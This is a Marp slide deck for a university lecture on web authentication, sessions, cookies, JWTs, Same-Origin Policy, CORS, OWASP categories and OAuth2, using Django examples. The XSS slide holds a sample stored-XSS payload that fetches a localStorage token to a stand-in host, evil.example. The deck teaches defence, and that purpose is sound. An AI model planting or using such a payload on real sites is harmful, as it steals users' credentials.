---
marp: true
theme: default
paginate: true
style: |
  section { font-size: 1.4rem; }
  pre { font-size: 0.85rem; }
  h1 { color: #092e20; }
  h2 { color: #44b78b; }
  .columns { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
  code { background: #f5f5f5; padding: 0.1em 0.3em; border-radius: 3px; }
---
{% raw %}

# Lecture 6

## Authentication, Authorisation, and Browser Trust

**WWW 25/26**

Identity · Sessions · Cookies · Same-Origin Policy · CORS · OWASP · OAuth2

---

# What this lecture is about

This lecture is about **ideas**, not framework wiring.

- How does the web remember who you are?
- Why do cookies create security problems?
- Why can one site sometimes send requests to another site?
- What do Same-Origin Policy and CORS actually do?
- Why do OWASP categories keep appearing in auth systems?

> The lab will cover the Django implementation details.

---

# Two Different Questions

<div class="columns">
<div>

## Authentication

**Who are you?**

Proof of identity.

- password
- one-time code
- token
- certificate

</div>
<div>

## Authorisation

**What can you do?**

Control of actions.

- read a post
- edit your own profile
- delete any comment
- access the admin panel

</div>
</div>

> Many security bugs come from treating these as the same thing.

---

# A classic mistake

Suppose a system checks:

- "Is the user logged in?"

but forgets to check:

- "Is this user allowed to do **this** action on **this** object?"

Then you get bugs like:

- any logged-in user can delete any post
- any logged-in user can view any invoice
- any logged-in user can access `/admin/`

This is **broken access control**, not a login bug.

---

# The web is stateless

HTTP does not remember previous requests.

```text
GET /dashboard HTTP/1.1
Host: mysite.com
```

That request does not inherently say:

- who sent it,
- whether they logged in 5 seconds ago,
- whether they are the same browser as before.

So web apps must add state **on top of** HTTP.

---

# Three ways to add state

1. **Send credentials every time**
   - simple idea
   - terrible UX
   - risky if the password travels constantly

2. **Client-side token**
   - often used in APIs
   - discussed later in the course

3. **Server-side session + browser cookie**
   - today's main model
   - common in Django and many traditional web apps

---

# JWT in one sentence

A **JWT** (**JSON Web Token**) is a token that carries signed claims, often something like:

```text
header.payload.signature
```

Typical claims might include:

- who the user is
- when the token expires
- who issued it
- what audience it is meant for

Unlike a classic server-side session, the token itself carries data.

---

# Example JWT contents

Example JWT:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiI0MiIsIm5hbWUiOiJBbGljZSIsInJvbGUiOiJzdHVkZW50IiwiaWF0IjoxNzQyNjM0MDAwLCJleHAiOjE3NDI2Mzc2MDB9.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

Decoded idea:

```json
header = {
  "alg": "HS256",
  "typ": "JWT"
}

payload = {
  "sub": "42",
  "name": "Alice",
  "role": "student",
  "iat": 1742634000,
  "exp": 1742637600
}
```

Important:

- the payload is usually **encoded**, not encrypted
- whoever holds the token can usually present it
- signatures protect integrity, not secrecy

---

# Sessions vs JWTs

<div class="columns">
<div>

## Session model

- browser stores a random session id
- server stores the real state
- server can invalidate centrally
- common for server-rendered apps

</div>
<div>

## JWT model

- client stores a signed token
- token carries claims
- server verifies signature
- common in APIs and distributed systems

</div>
</div>

Neither model is automatically "more secure".

The trade-offs are different.

---

# Common JWT misconceptions

## Wrong idea

"JWT means no server-side state and therefore security becomes simpler."

## Better idea

JWTs move some problems around:

- token storage still matters
- revocation becomes harder
- short expiry becomes important
- refresh-token design matters
- browser use still has CSRF/XSS trade-offs depending on storage

So JWT is not a silver bullet. It is a different architecture choice.

---

# Access token vs refresh token

Many JWT-based systems use **two** token types:

| Token | Purpose | Lifetime |
|---|---|---|
| **Access token** | sent with API requests | short |
| **Refresh token** | used to obtain a new access token | longer |

Idea:

- keep the access token short-lived
- use the refresh token less often
- reduce damage if an access token is stolen

This is why "JWT auth" is often really a **token pair** design, not a single token.

---

# JWT refresh flow

```text
1. User logs in
2. Server issues:
   - access token
   - refresh token
3. Access token expires
4. Client sends refresh token to a refresh endpoint
5. Server validates it
6. Server returns a new access token
```

Security consequence:

- whoever can use the refresh token can often keep getting new access tokens
- refresh tokens should expire, support revocation, and ideally be rotated
- real refresh flows often reintroduce some server-side tracking

So refresh tokens usually need stricter protection than access tokens.

---

# Where do browser tokens live?

This question is as important as the token format.

Common options:

- **memory**
  - disappears on reload
  - harder to persist accidentally
- **localStorage / sessionStorage**
  - convenient
  - readable by JavaScript, so XSS is dangerous
- **cookie**
  - can be `HttpOnly`
  - but then browser automation and CSRF concerns return

So token storage is a browser-security question, not just an API-design question.

---

# Session idea in one sentence

A **session** is server-side memory about a browser.

The browser does **not** usually carry the whole login state.

Instead it carries a **reference**:

```text
sessionid = "a8f3c9..."
```

What matters is that this value is:

- random-looking
- opaque to the browser
- meaningful only to the server

The server maps that random string to data such as:

- user id
- login time
- other security-related state
- temporary messages

---

# Session flow

```text
Browser                          Server
  |                                |
  | POST /login                    |
  | username + password            |
  |------------------------------->|
  |                                | verify credentials
  |                                | create session
  |                                | session key = a8f3c9
  | 200 OK                         |
  | Set-Cookie: sessionid=a8f3c9   |
  |<-------------------------------|
  |                                |
  | GET /profile                   |
  | Cookie: sessionid=a8f3c9       |
  |------------------------------->|
  |                                | load session
  |                                | identify user
  |<-------------------------------|
```

---

# Django anchor: what the server reconstructs

In Django, the session/cookie machinery is usually summarized for you as:

```python
def profile(request):
    if request.user.is_authenticated:
        return HttpResponse(f"Hello, {request.user.username}")
    return redirect("/login/")
```

Important idea:

- `request.user` is not "magic browser state"
- it is the result of server-side session lookup on each request

---

# Cookie idea in one sentence

A **cookie** is a small key-value pair that the browser stores and sends automatically.

Example:

```text
Set-Cookie: sessionid=a8f3c9; HttpOnly; Secure; SameSite=Lax
```

Important point:

- the cookie is usually **not** the user
- it is a **credential**
- whoever controls it may be treated as the user

So a session cookie must be protected like a password surrogate.

---

# What makes cookies dangerous

Cookies are convenient because the browser sends them automatically.

That same convenience creates risk:

- the user does not manually approve each send
- a cross-site request may include cookies automatically
- stolen cookies may allow session hijacking
- badly scoped cookies may leak across subdomains or paths

So cookies solve the state problem, but create a **trust problem**.

---

# Cookie attributes are security policy

| Attribute | Why it matters |
|---|---|
| `HttpOnly` | JavaScript cannot read the cookie directly |
| `Secure` | Cookie is sent only over HTTPS |
| `SameSite=Lax` | Limits when cookies travel on cross-site requests |
| `Expires` / `Max-Age` | Defines lifetime |
| `Path` / `Domain` | Defines where the cookie is sent |

These are not cosmetic settings.

They define the browser's behavior at a security boundary.

---

# Cookie scope: SameSite, Path, Domain

Example:

```text
Set-Cookie: sessionid=abc123; SameSite=Lax; Path=/app/; Domain=example.com
```

What this means:

- **`SameSite=Lax`**
  - browser is more restrictive about sending the cookie on cross-site requests
  - helps reduce some CSRF cases
  - but it does not mean "never sent cross-site under any circumstances"

- **`Path=/app/`**
  - send this cookie only for URLs under `/app/`
  - for example: `/app/profile` yes, `/admin/` no

# Cookie scope: SameSite, Path, Domain cont

- **`Domain=example.com`**
  - send this cookie to `example.com` and its subdomains
  - for example: `app.example.com` and `api.example.com`

Security intuition:

- `SameSite` controls **cross-site behavior**
- `Path` controls **URL path scope**
- `Domain` controls **host/subdomain scope**

Making scope wider than necessary increases risk.

---

# HTTPS is part of web security

Without HTTPS, a network attacker may be able to:

- read credentials in transit
- steal session cookies or tokens
- modify traffic
- impersonate the server to the browser

So transport security is not "just deployment".

It is part of how web authentication stays trustworthy in transit.

`Secure` cookies help, but only together with HTTPS.

---

# Security starts with trust boundaries

In web security, always ask:

- What can the **browser** read?
- What can the **browser** send automatically?
- What can an **attacker-controlled site** trigger?
- What can the **server** verify independently?

This leads directly to:

- Same-Origin Policy
- CORS
- cookie hardening

---

# What is an origin?

An **origin** is:

```text
scheme + host + port
```

Examples:

| URL | Origin |
|---|---|
| `https://example.com` | `https://example.com:443` |
| `http://example.com` | different origin |
| `https://api.example.com` | different origin |
| `https://example.com:8443` | different origin |

So even small URL differences can cross a security boundary.

---

# Same-Origin Policy (SOP)

The **Same-Origin Policy** is the browser's default isolation rule.

Roughly:

- scripts from one origin should not freely read data from another origin

Without SOP, any site you visit could read:

- your email inbox web UI
- your bank page
- your university portal
- your GitHub session data

SOP is one of the core reasons the web is usable at all.

---

# What SOP blocks

If JavaScript from `evil.com` runs in your browser, SOP normally prevents it from reading data from `bank.com`, such as:

- HTML returned by `bank.com`
- JSON returned by `bank.com/api`
- cookies belonging to `bank.com`
- DOM of a page from `bank.com`
- `localStorage` belonging to `bank.com`

This is a **read barrier** between origins.

---

# What SOP does not block

SOP does **not** mean "cross-origin traffic is impossible".

Browsers still allow many cross-origin actions:

- following a link
- submitting a form
- loading an image
- loading a script
- loading an iframe
- requesting a stylesheet

So an attacker may sometimes cause a request to happen,
even if they cannot read the response.

That distinction is crucial.

---

# Cross-origin sending vs cross-origin reading

The important distinction is:

- browsers may allow many kinds of **cross-origin sending**
- browsers are much stricter about **cross-origin reading**

So one origin may be able to trigger traffic to another origin,
while still being unable to inspect the response body.

This is exactly the gap that makes browser security subtle.

---

# Where SameSite helps - and where it does not

`SameSite` is useful, but students often overestimate it.

It helps because:

- it can stop some cross-site cookie sends
- it reduces some risks created by automatic cookie sending

It does **not** mean:

- "cross-origin requests are impossible"
- "XSS does not matter"

Security is layered, not one-setting deep.

---

# XSS changes the whole picture

**Cross-Site Scripting (XSS)** means attacker-controlled script runs in your origin.

That matters because malicious script may:

- read `localStorage` and `sessionStorage`
- modify the page and steal user input
- send authenticated requests as the user
- act with the same origin privileges as your own code

Example:

```html
<!-- attacker submits this as a comment -->
<script>
  fetch("https://evil.example/steal?c=" + encodeURIComponent(localStorage.getItem("token")))
</script>
```

If your site renders that comment as HTML instead of escaping it, the script runs in **your** origin, not the attacker's.

Important nuance:

- `HttpOnly` helps stop direct cookie theft
- but it does **not** stop malicious script from sending requests through the browser

So XSS breaks many assumptions behind both token storage and cookie-based auth.

---

# CORS: a different problem

**CORS** stands for **Cross-Origin Resource Sharing**.

CORS is about:

- whether a browser lets JavaScript from one origin **read** a response from another origin

It does not decide who is authenticated or authorized.

---

# SOP and CORS together

Think of it like this:

- **SOP** = default rule: "do not let one origin read another origin's responses"
- **CORS** = controlled exception: "allow this origin to read this response"

Server response headers decide this, for example:

```text
Access-Control-Allow-Origin: https://app.example
```

So CORS is a browser-enforced sharing policy.

---

# Simple CORS example

Suppose JavaScript on:

```text
https://app.example
```

wants to fetch:

```text
https://api.example/data
```

If the API sends the right CORS headers, the browser may allow the script to read the response.

If not, the request may still be sent, but the browser will block the script from seeing the response.

Again: sending and reading are different questions.

---

# CORS as a picture

```text
JavaScript on app.example
        |
        | fetch("https://api.example/data")
        v
Browser -------------------------------------------------> api.example
        |                                                   |
        | <-----------------------------------------------  |
        |   Access-Control-Allow-Origin: https://app.example
        |
        | browser decides whether JS may read the response
        v
Script gets data   OR   browser blocks access
```

The browser is enforcing the policy on behalf of the server.

---

# What is a preflight request?

For some cross-origin requests, the browser first sends:

```text
OPTIONS /resource
```

This is the **preflight**.

It asks the server:

- do you allow this origin?
- do you allow this method?
- do you allow these headers?

The browser checks the answer before sending the real request.

---

# Common CORS misunderstandings

## Wrong idea

"If I enable CORS, I have secured my API."

## Correct idea

CORS is **not authentication** and **not authorisation**.

It only tells the browser whether JavaScript may read the response.

So:

- a public endpoint can have restrictive CORS
- a sensitive endpoint can have permissive CORS and still require auth
- non-browser clients are not governed by browser CORS rules

Never use CORS as your only access control.

---

# Passwords are a special case of trust

Passwords are not just another field in a database.

If password storage fails, users are harmed beyond your app because many people reuse passwords.

That is why password handling is treated as a major security topic:

- verify carefully
- store indirectly
- slow down guessing
- assume database leaks are possible

---

# Never store plaintext passwords

Correct idea:

```text
store = slow_hash(salt + password)
```

Important ingredients:

- **hash**: one-way transformation
- **salt**: random per-password value
- **work factor**: deliberately slow computation

Goal:

- make offline cracking expensive
- prevent identical passwords from producing identical stored values

---

# Why fast hashes are not enough

Algorithms like plain SHA-256 are designed to be fast.

That is good for checksums.
It is bad for password storage.

If an attacker steals a password database, they can try millions or billions of guesses quickly unless the scheme is deliberately slow.

This is why systems use password hashers such as:

- PBKDF2
- bcrypt
- scrypt
- Argon2

---

# Threats against authentication

Even if passwords are hashed correctly, auth still fails if the system allows:

- weak passwords
- unlimited guessing
- session fixation
- session hijacking
- credential stuffing
- predictable password resets
- unsafe "remember me" logic

Authentication is a **system**, not one function call.

---

# Password reset is part of authentication

Account recovery is effectively an alternative login path.

If password reset is weak, the whole authentication system is weak.

Good reset design needs:

- hard-to-guess reset tokens
- short expiry
- single use
- careful account binding
- no leakage of whether an email address exists

In practice, the security of the user's email account becomes part of your security model.

---

# Django anchor: authentication vs authorisation

A short Django example shows the distinction:

```python
from django.contrib.auth.decorators import login_required

@login_required
def delete_post(request, post_id):
    post = Post.objects.get(pk=post_id)
    if request.user != post.author:
        return HttpResponseForbidden("Not your post")
    ...
```

`@login_required` answers "who are you?"

The ownership check answers "are you allowed to do this?"

---

# Authorisation models

After login, the next question is:

> what is this user allowed to do?

Common models:

- **role-based**: student, teacher, admin
- **permission-based**: can edit post, can delete comment
- **ownership-based**: can edit only your own object
- **attribute-based**: depends on department, course, time, status

Real systems often combine these.

---

# A subtle but common bug

A page can look secure in the UI but still be insecure on the server.

Example:

- the "Delete" button is hidden for normal users
- but the server endpoint still accepts the request

This is why security cannot live only in:

- HTML
- CSS
- JavaScript

The server must enforce the rule.

---

# OWASP as a map of failure modes

OWASP is useful not because students should memorize a list,
but because it organizes recurring classes of mistakes.

For this lecture, the most relevant categories are:

- Broken Access Control
- Identification and Authentication Failures
- Cryptographic Failures
- Injection
- Security Misconfiguration

Think of OWASP as a vocabulary for discussing how systems fail.

---

# OWASP: Broken Access Control

This means the system fails to enforce "who may do what".

Typical examples:

- user A can read user B's data
- any logged-in user can call an admin endpoint
- direct object reference like `/invoice/42` reveals another user's invoice
- client-side checks exist, server-side checks do not

Typical consequences:

- privacy breach
- data corruption
- privilege escalation

This is often about missing checks, not broken crypto.

---

# OWASP: Identification and Authentication Failures

This means identity proof or session management is weak.

Examples:

- weak password policy
- no rate limiting on login
- session id not rotated after login
- session not invalidated on logout
- password reset tokens that are guessable or never expire

Typical consequences:

- account takeover
- persistent hijacking
- large-scale credential stuffing success

This category is where many "login bugs" really live.

---

# OWASP: Cryptographic Failures

This is not only about advanced math.

Often it means basic misuse:

- plaintext passwords
- obsolete hashes
- secrets committed to source control
- tokens sent over HTTP instead of HTTPS
- sensitive data stored without proper protection

Consequence:

- a database leak becomes immediately catastrophic
- intercepted traffic becomes usable

Crypto is powerful, but only when used appropriately.

---

# OWASP: Injection

Injection happens when untrusted input becomes part of a command or query.

Examples:

- SQL injection in login queries
- command injection in shell calls
- template injection

Auth systems are common targets because attackers want to:

- bypass login checks
- dump user tables
- elevate privileges

Frameworks help, but unsafe string construction can reintroduce the problem.

---

# OWASP: Security Misconfiguration

This is where many "small" mistakes become major incidents.

Examples:

- `DEBUG=True` in production
- verbose error pages
- missing HTTPS enforcement
- permissive CORS for the wrong origin
- default credentials
- secrets in repositories
- unnecessary services or admin endpoints exposed

These are often boring mistakes with serious consequences.

---

# Which protections come from the framework?

Frameworks like Django help by default with things such as:

- server-side sessions
- password hashing
- ORM-based SQL parameterisation
- useful security settings

But the framework does **not** decide:

- your access-control rules
- whether you over-share data
- whether your CORS policy is sensible
- whether you leak secrets
- whether your architecture makes sense

Secure defaults help; they do not replace thinking.

---

# JWT is not OAuth2

Students often mix these up:

| Thing | What it is |
|---|---|
| **JWT** | a token format for carrying claims |
| **OAuth2** | a protocol/framework for delegated authorization and related identity flows |

Relationship:

- OAuth2 can be used **without** JWTs
- JWTs can be used **without** OAuth2
- some systems use OAuth2 to obtain tokens, and those tokens happen to be JWTs

So asking "should we use JWT or OAuth2?" is mixing two different layers of the system.

---

# OAuth2: what problem does it solve?

Without OAuth2:

- your site collects and verifies the user's password directly

With OAuth2:

- another provider verifies the user
- your app receives a controlled proof or token

Example:

- "Log in with GitHub"

This is useful when:

- users already have provider accounts
- you do not want to manage another password database
- you want delegated identity, not local credential storage

---

# OAuth2 at a high level

```text
User            Your app            Provider
  |                 |                  |
  | click login     |                  |
  |---------------->|                  |
  |                 | redirect         |
  |                 |----------------->|
  | authenticate at provider           |
  |<---------------------------------->|
  |                 | callback with code
  |                 |<-----------------|
  |                 | exchange code    |
  |                 |----------------->|
  |                 | receive token    |
  |                 |<-----------------|
  | logged in       |                  |
  |<----------------|                  |
```

The user authenticates to the provider, not to your app directly.

---

# OAuth2 roles and artifacts

It helps to separate the moving parts:

| Thing | Meaning |
|---|---|
| **Resource owner** | usually the user |
| **Client** | your app |
| **Authorization server** | provider component that issues codes/tokens |
| **Resource server** | API that accepts access tokens |
| **Authorization code** | short-lived value returned after user approval |
| **Access token** | credential for API calls |

Students often confuse the **code**, **token**, and **session**. They are different artifacts with different purposes.

---

# OAuth2 authorization code flow, more explicitly

```text
1. Your app redirects the browser to the provider
2. The provider authenticates the user
3. The provider asks for consent
4. The provider redirects back with a short-lived code
5. Your server exchanges the code for a token
6. Your server optionally calls the provider API
7. Your app creates its own local session
```

This last step matters:

- OAuth2 login usually ends with your app still creating **its own** session cookie

---

# Why redirect_uri matters

The provider should send the user back only to an expected callback URL:

```text
https://yourapp.example/accounts/github/login/callback/
```

Why this matters:

- it prevents codes from being sent to arbitrary attacker-controlled locations
- it binds the OAuth2 flow to a registered application endpoint

So the callback URL is part of the trust boundary, not just a routing detail.

---

# Important OAuth2 security ideas

- **`state` parameter** helps prevent request forgery in the callback flow
- **scopes** should be minimal
- **access token** is not the same thing as your app session
- **client secret** must stay server-side

In modern OAuth2 discussions you will also hear about **PKCE**:

- a proof mechanism mainly important for public clients such as mobile apps or single-page apps
- it makes intercepted authorization codes less useful
- conceptually, it says: "the client that started the flow should prove it is the same client finishing it"

Common confusion:

- OAuth2 is about delegated access / identity flow
- it is not a magic replacement for local security design

You still need sane sessions, access control, and secure storage.

---

# Where Django fits in this story

Django is useful here not because it changes the ideas,
but because it gives concrete implementations of them:

- session-based login
- cookie handling
- permission checks
- user model
- social login packages built on OAuth2

So the framework is the **example**.
The browser and security model are the **subject**.

---

# Django anchor: social login as a thin layer on top

In Django, a social-login package can make OAuth2 look deceptively simple:

```python
path("accounts/", include("allauth.urls"))
```

That one line hides a lot of machinery:

- redirects
- callback handling
- code/token exchange
- user mapping
- session creation

So it is useful precisely because the underlying idea is more complicated than the code suggests.

---

# What the lab will cover

In the lab, you will implement these ideas in Django:

- registration and login
- logout with proper POST semantics
- session-backed identity
- view protection
- ownership and permissions
- GitHub login via OAuth2 tooling

So today you should leave with a mental model of:

- why the controls exist
- what attacks they address
- what assumptions the browser is making

---

# Mental model summary

1. HTTP is stateless
2. Sessions add server-side memory
3. Cookies carry credentials automatically
4. SOP limits cross-origin reads
5. CORS selectively relaxes SOP for reading
6. Browser security depends on the distinction between sending and reading
7. Auth says who you are
8. Authorisation says what you can do
9. OWASP names common ways these systems fail

---

# Key takeaways

1. **Authentication and authorisation are different problems**
2. **Sessions solve statelessness, but cookies become sensitive credentials**
3. **Same-Origin Policy blocks many cross-origin reads, not all cross-origin requests**
4. **CORS is a sharing policy, not an auth mechanism**
5. **Cross-origin sending and cross-origin reading are different security questions**
6. **Password security depends on slow salted hashes and good system design**
7. **OWASP categories help you reason about real failure modes**
8. **The lab is where you will wire these ideas into Django**

---

# Questions?

<br>

> Further reading:
>
> - Django docs: *Authentication in Django*
> - OWASP Authentication Cheat Sheet
> - OWASP Top 10
> - MDN: Same-Origin Policy
> - MDN: CORS
> - RFC 6749 - OAuth 2.0 Authorization Framework

{% endraw %}
